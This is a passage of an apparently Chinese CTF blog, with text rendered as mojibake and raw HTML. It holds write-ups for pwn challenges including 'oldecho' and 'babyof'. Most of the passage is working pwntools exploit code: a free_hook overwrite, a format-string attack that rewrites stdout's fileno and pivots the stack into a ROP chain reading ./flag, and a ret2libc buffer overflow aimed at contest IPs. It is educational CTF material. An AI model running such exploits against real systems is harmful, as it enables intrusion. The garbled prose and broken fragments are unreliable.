class="number">0x20</span>)</span><br><span class="line">		+p64(free_hook))</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x18</span>)</span><br><span class="line">	add(<span class="number">0x18</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">2</span>,p64(one))</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        log.info(<span class="string">&quot;Times:%d&quot;</span>%i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;121.36.250.162&quot;</span>,<span class="number">49153</span>)</span><br><span class="line">            <span class="comment">#p = process(&quot;./bornote&quot;)</span></span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;d483f651c1cbcad9a7bb87d04d498ea7&#125;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="å…«ã€oldecho"   >
          <a href="#å…«ã€oldecho" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…«ã€oldecho" class="headerlink" title="å…«ã€oldecho"></a>å…«ã€oldecho</h1>
      <p>è¿™é“é¢˜ç›®æœ€æœ‰æ„æ€äº†ï¼Œclose(1)ï¼Œç„¶åå¾ªç¯çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚éœ€è¦æ”¹stdoutçš„filenoä¸º2æ‰èƒ½æ¢å¤è¾“å‡ºã€‚åŒæ—¶ç”±äºclose(1)ï¼Œå¯¼è‡´æ ¼å¼åŒ–è¾“å‡ºprintfçš„å¤§å°ä¸èƒ½å¤ªå¤§ï¼Œå¤§æ¦‚0x2000å·¦å³å°±ä¸è¡Œäº†ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦çˆ†ç ´ä¸€ä¸‹ã€‚ä¹‹ååˆç”±äºæ ˆç¯å¢ƒé—®é¢˜ï¼Œè¿™é‡Œç»™äº†æ ˆåœ°å€ï¼Œä½†ä¹Ÿæ˜¯éœ€è¦çˆ†ç ´ä¸€ä¸‹æœ€åçš„ä¸€äº›å¤§å°é—®é¢˜ï¼Œå¤§æ¦‚è®¾ç½®åœ¨ä¸€å®šèŒƒå›´å¯æ§ã€‚</p>
<p>æ­¤å¤–ç”±äºæ ˆä¸Šæ²¡æœ‰stdoutï¼Œæ‰€ä»¥éœ€è¦æŠ¬æ ˆï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšè¿‡æ”¹filenoçš„ï¼Œæ˜¯å­¦é•¿åšçš„ã€‚èµ›åç…§ç€è‡ªå·±çš„æ€è·¯å¤ç°äº†ä¸€ä¸‹ï¼Œå…ˆè¦†ç›–è¿”å›åœ°å€è¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•°ï¼Œå³mainå‡½æ•°ä¸­ï¼Œä¹‹åå†è¿”å›åˆ°startï¼Œä¹‹åå°±ä½¿å¾—å¯ä»¥åœ¨æ ˆä¸Šç•™ä¸‹IO_2_1_stoutã€‚(è¿™é‡Œå…·ä½“ä¸ºä»€ä¹ˆä¼šå‡ºç°æˆ‘ä¹Ÿä¸å¤ªæ‡‚)</p>
<p>ç„¶åå°±æ˜¯æ”¹è¿”å›åœ°å€ï¼Œpop rbpå°†è¾“å…¥çš„bssæ®µç»™rbpï¼Œç„¶åå€ŸåŠ©leave retæŒ‡ä»¤å°†rbpç»™åˆ°rspï¼ŒåŠ«æŒæ ˆåˆ°è¾“å…¥çš„bssæ®µä¸Šï¼Œä¹‹åå°±æ˜¯æ­£å¸¸çš„ORWã€‚</p>
<p>è¿™é‡Œå€ŸåŠ©æ ˆå¯»æ‰¾gadgetä¹Ÿæ˜¯ä¸€ä¸ªå°éš¾ç‚¹ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">binary = &quot;./oldecho&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">#context.binary = binary</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">    myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.close()</span><br><span class="line">    pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    #p = remote(&quot;123.60.32.152&quot;,49153)</span><br><span class="line">    p.recvuntil(&#x27;Gift: &#x27;)</span><br><span class="line">    stack = int(p.recv(14),16)</span><br><span class="line">    log.info(&#x27;Stack:\t&#x27; + hex(stack))</span><br><span class="line">    offset = 9</span><br><span class="line">    retval = stack&amp;0xFFFF</span><br><span class="line">    if retval &gt; 0x2000:</span><br><span class="line">        raise Exception(&quot;Invalid stack!&quot;)</span><br><span class="line"></span><br><span class="line">    retval1 = stack&amp;0xFF</span><br><span class="line">    if retval1 &lt;= 0x50:</span><br><span class="line">        raise Exception(&quot;Invalid stack!&quot;)</span><br><span class="line">    </span><br><span class="line">    retval2 = stack&amp;0xFF</span><br><span class="line">    if retval1 &gt;= 0xe8:</span><br><span class="line">        raise Exception(&quot;Invalid stack!&quot;)</span><br><span class="line">    </span><br><span class="line">    #return to 0xe40 main to get io_2_1_stdout</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF) - 0x10)) + &#x27;c%6$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(0x40) + &#x27;c%10$hhn&#x27;)</span><br><span class="line">    </span><br><span class="line">    #return to start</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF) - 0x38)) + &#x27;c%6$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(0x3f) + &#x27;c%10$hhn&#x27;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    #change list to io</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF) - 0x80)) + &#x27;c%15$hhn&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line">    </span><br><span class="line">    #change IO fileno</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(0x90) + &#x27;c%41$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(0x2) + &#x27;c%29$hhnGet&#x27;)</span><br><span class="line">    # p.recvuntil(&#x27;xxxx&#x27;,timeout=0.5)</span><br><span class="line">    # #dockerDbg()</span><br><span class="line">    test = &#x27;AAAA&#x27;</span><br><span class="line">    leakPl =  &quot;ELF:%7$p.Libc:%13$p&quot;</span><br><span class="line">    </span><br><span class="line">    # p.sendline(test)</span><br><span class="line">    ru(&quot;Get&quot;)</span><br><span class="line">    #dockerDbg()</span><br><span class="line">    p.sendline(leakPl)</span><br><span class="line">    #pause()</span><br><span class="line">    #p.interactive()</span><br><span class="line">    ru(&quot;ELF:0x&quot;)</span><br><span class="line">    elf_base = int(rc(12),16) -0xe1e</span><br><span class="line">    ru(&quot;Libc:0x&quot;)</span><br><span class="line">    libc_base = int(rc(12),16) - 240 -libc.sym[&#x27;__libc_start_main&#x27;]</span><br><span class="line">    if libc_base&amp;0xFFFF &gt; 0x2000:</span><br><span class="line">        raise Exception(&quot;Invalid Libc!&quot;)</span><br><span class="line">    # print(elf_base)</span><br><span class="line">    # print(libc_base)</span><br><span class="line">    lg(&quot;elf_base&quot;,elf_base)</span><br><span class="line">    lg(&quot;libc_base&quot;,libc_base)</span><br><span class="line">    #pause()</span><br><span class="line">    </span><br><span class="line">    pop_rbp_r13_r14_ret =libc_base + 0x00000000000206d1</span><br><span class="line">    pop_rsi_ret = libc_base + 0x00000000000202f8</span><br><span class="line">    pop_rdi_ret = libc_base + 0x0000000000021112</span><br><span class="line">    pop_rdx_ret = libc_base + 0x0000000000001b92</span><br><span class="line">    pop_rdx_rsi = libc_base + 0x00000000001151c9</span><br><span class="line">    pop_rax_ret = libc_base + 0x000000000003a738</span><br><span class="line">    xchg_eax_esp_ret = libc_base + 0x0aa985</span><br><span class="line">    Open = libc_base + libc.sym[&#x27;open&#x27;]</span><br><span class="line">    Read = libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">    Puts = libc_base + libc.sym[&#x27;puts&#x27;]</span><br><span class="line">    orw  = &#x27;./flag\x00\x00&#x27;</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(elf_base + 0x202060)</span><br><span class="line">    orw += p64(pop_rsi_ret) + p64(0) </span><br><span class="line">    orw += p64(Open)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">    orw += p64(pop_rsi_ret) + p64(elf_base + 0x2020F0)</span><br><span class="line">    orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">    orw += p64(Read)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(elf_base + 0x2020F0)</span><br><span class="line">    orw += p64(Puts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #dockerDbg()</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF)+0x8)) + &#x27;c%6$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(0x60) + &#x27;c%10$hhn&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #dockerDbg()</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF)+ 0x20)) + &#x27;c%6$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(0x3e) + &#x27;c%10$hhn&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line">    </span><br><span class="line">    #dockerDbg()</span><br><span class="line">    p.sendline(&#x27;%&#x27; + str(((stack&amp;0xFF))) + &#x27;c%6$hhn&#x27;)</span><br><span class="line">    p.sendline(&#x27;%&#x27;+ str(pop_rbp_r13_r14_ret&amp;0xFFFF) + &#x27;c%10$hn&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #dockerDbg()</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload += &quot;Bye~&quot;</span><br><span class="line">    payload = payload.ljust(0x20,&#x27;\x00&#x27;)</span><br><span class="line">    payload += orw</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i += 1</span><br><span class="line">    log.info(&quot;Times:%d&quot;%i)</span><br><span class="line">    try:</span><br><span class="line">        p = process(binary)</span><br><span class="line">        pwn()</span><br><span class="line">    except EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        continue</span><br><span class="line">    except Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        p.interactive()</span><br><span class="line">        break</span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># flag&#123;NpfH6fzHStuKl2CRfvheXWyKO3Bz60F5&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ€»çš„æ¥è¯´è¿™æ¬¡pwnç€å®æœ‰ç‚¹æ°´ï¼Œå’Œå¼ºç½‘æ¯ä¸€æ¯”å·®å¥½è¿œå•Šã€‚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/24/%E9%B9%A4%E5%9F%8E%E6%9D%AFWP/">é¹¤åŸæ¯WP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-10-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-10-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è¿™æ¬¡æ¯”èµ›å°±å‘çˆ¹</p>

        <h1 id="ä¸€ã€babyof"   >
          <a href="#ä¸€ã€babyof" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€babyof" class="headerlink" title="ä¸€ã€babyof"></a>ä¸€ã€babyof</h1>
      <p>æ ˆæº¢å‡ºç™½ç»™ï¼Œæ³„éœ²åœ°å€åç›´æ¥æ‰“å³å¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./babyof&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="string">&quot;29394&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x40066B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400743</span></span><br><span class="line">ret = <span class="number">0x400744</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">64</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;I hope you win\n&quot;</span>)</span><br><span class="line">puts_addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:0x%x&quot;</span>%puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system</span></span><br><span class="line">binsh_addr = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr:0x%x&quot;</span>%binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">64</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3c011eeb10d8b8256d4eeb1a700262d3&#125;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="äºŒã€littleof"   >
          <a href="#äºŒã€littleof" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€littleof" class="headerlink" title="äºŒã€littleof"></a>äºŒã€littleof</h1>
      <p>æ ˆæº¢å‡ºåŠ canaryï¼Œä¹Ÿæ˜¯ç™½ç»™ï¼Œå°±æ˜¯ä¸çŸ¥é“æ”¾ä¸ªstdin fileåœ¨æ ˆä¸Šæ˜¯å•¥æ„æ€</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 